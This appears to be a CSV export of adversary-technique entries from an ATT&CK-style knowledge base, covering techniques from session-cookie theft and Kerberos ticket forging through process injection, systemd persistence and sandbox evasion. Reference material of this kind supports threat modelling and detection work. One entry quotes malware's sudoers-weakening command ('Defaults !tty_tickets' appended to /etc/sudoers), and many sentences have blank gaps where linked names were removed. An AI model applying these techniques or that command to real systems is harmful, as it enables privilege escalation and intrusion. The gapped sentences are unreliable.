Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.There are several examples of malware targeting cookies from web browsers on the local system. There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.After an adversary acquires a valid cookie, they can then perform a  technique to login to the corresponding web application.",technique
Steal or Forge Kerberos Tickets,"Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable . Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as realms, there are three basic participants: client, service, and Key Distribution Center (KDC). Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.",technique
Steganography,"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files. was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. By the end of 2017, a threat group usedInvoke-PSImageto hide  commands in an image file (.png) and execute the code on a victim's system. In this particular case the  code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.  ",technique
Steganography,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ",technique
Stored Data Manipulation,"Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",technique
Subvert Trust Controls,"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct  or  in support of subverting these controls. Adversaries may also create or steal code signing certificates to acquire trust on target systems. ",technique
Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."" Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL . Elevated privileges are required to edit this file though.Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \'Defaults !tty_tickets\' >> /etc/sudoers . In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",technique
Supply Chain Compromise,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:* Manipulation of development tools* Manipulation of a development environment* Manipulation of source code repositories (public or private)* Manipulation of source code in open-source dependencies* Manipulation of software update/distribution mechanisms* Compromised/infected system images (multiple cases of removable media infected at the factory)   * Replacement of legitimate software with modified versions* Sales of modified/counterfeit products to legitimate distributors* Shipment interdictionWhile supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.    Targeting may be specific to a desired victim set  or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.   Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. ",technique
Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",technique
System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  during automated discovery to shape follow-on behaviors. Specific checks may will vary based on the target and/or adversary, but may involve behaviors such as , , , and  to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.  Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",technique
System Firmware,"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.   System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",technique
System Information Discovery,"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such as  can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS systemsetup command, but it requires administrative privileges.Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",technique
System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include , /, , and .Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",technique
System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.Utilities and commands that acquire this information include , ""net use,"" and ""net session"" with . In Mac and Linux,  and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to ""net session"".",technique
System Owner/User Discovery,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using . The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Utilities and commands that acquire this information include whoami. In Mac and Linux, the currently logged in user can be identified with w and who.",technique
System Service Discovery,"Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are ""sc,"" ""tasklist /svc"" using , and ""net start"" using , but adversaries may also use other tools as well. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",technique
System Services,"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence (), but adversaries can also abuse services for one-time or temporary execution.",technique
System Shutdown/Reboot,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer. Shutting down or rebooting systems may disrupt access to computer resources for legitimate users.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as  or , to hasten the intended effects on system availability.",technique
System Time Discovery,"An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network.  System time information may be gathered in a number of ways, such as with  on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.  The information could be useful for performing other techniques, such as executing a file with a  , or to discover locality information based on time zone to assist in victim targeting.",technique
Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources. Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the /etc/systemd/system and /usr/lib/systemd/system directories and have the file extension .service. Each service unit file may contain numerous directives that can execute system commands:* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. * ExecReload directive covers when a service restarts. * ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.While adversaries typically require root privileges to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as ~/.config/systemd/user/ to achieve user-level persistence.",technique
Systemd Timers,"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to  in Linux environments.Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are  unit files that are managed by the systemd system and service manager. Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.",technique
TFTP Boot,"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with  to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to  and may result in the network device running a modified image. ",technique
Taint Shared Content,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses  of directory .LNK files that use  to look like the real directories, which are hidden through . The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",technique
Template Injection,"Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsofts Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.  These documents can be delivered via other techniques such as  and/or  and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.  Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. This technique may also enable  by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.   ",technique
Thread Execution Hijacking,"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.This is very similar to  but targets an existing process rather than creating a process in a suspended state.  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ",technique
Thread Local Storage,"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process memory space using other  techniques such as .Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ",technique
Threat Intel Vendors,"Before compromising a victim, adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Time Based Evasion,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: ). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled  to avoid analysis and scrutiny. ",technique
Time Providers,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.  W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.  The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. ",technique
Timestomp,"Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.Timestomping may be used along with file name  to hide malware and tools.",technique
Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.",technique
Tool,"Before compromising a victim, adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: ). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as . Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",technique
Traffic Duplication,"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure.  Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device.  Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through  or . Adversaries may use traffic duplication in conjunction with , , or  depending on the goals and objectives of the adversary.",technique
Traffic Signaling,"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. ), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable  for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.    To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage  due to the monolithic nature of the architecture.",technique
Transfer Data to Cloud Account,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts. ",technique
Transmitted Data Manipulation,"Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",technique
Transport Agent,"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ",technique
Trap,"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where ""command list"" will be executed when ""signals"" are received.",technique
Trusted Developer Utilities Proxy Execution,"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",technique
Trusted Relationship,"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship exploits an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such,  used by the other party for access to internal network systems may be compromised and used.",technique
Two-Factor Authentication Interception,"Adversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. If a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. ",technique
Unix Shell,"Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with . Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.",technique
Unsecured Credentials,"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. ), operating system or application-specific repositories (e.g. ), or other specialized files/artifacts (e.g. ).",technique
Unused/Unsupported Cloud Regions,"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region.An example of adversary use of unused AWS regions is to mine cryptocurrency through , which can cost organizations substantial amounts of money over time depending on the processing power used.",technique
Use Alternate Authentication Material,"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the systemeither in memory or on diskit may be at risk of being stolen through  techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",technique
User Activity Based Checks,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  during automated discovery to shape follow-on behaviors. Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  or waiting for a user to double click on an embedded image to activate. ",technique
User Execution,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of .While  frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after .",technique
VBA Stomping,"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.An adversary may hide malicious VBA code by overwriting the VBA source code location with zeros, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.",technique
VDSO Hijacking,"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. VDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via . However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).   Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",technique
VNC,"Adversaries may use  to remotely control machines using Virtual Network Computing (VNC). The adversary may then perform actions as the logged-on user.VNC is a desktop sharing system that allows users to remotely control another computers display by relaying mouse and keyboard inputs over the network. VNC does not necessarily use standard user credentials. Instead, a VNC client and server may be configured with sets of credentials that are used only for VNC connections.",technique
Valid Accounts,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. ",technique
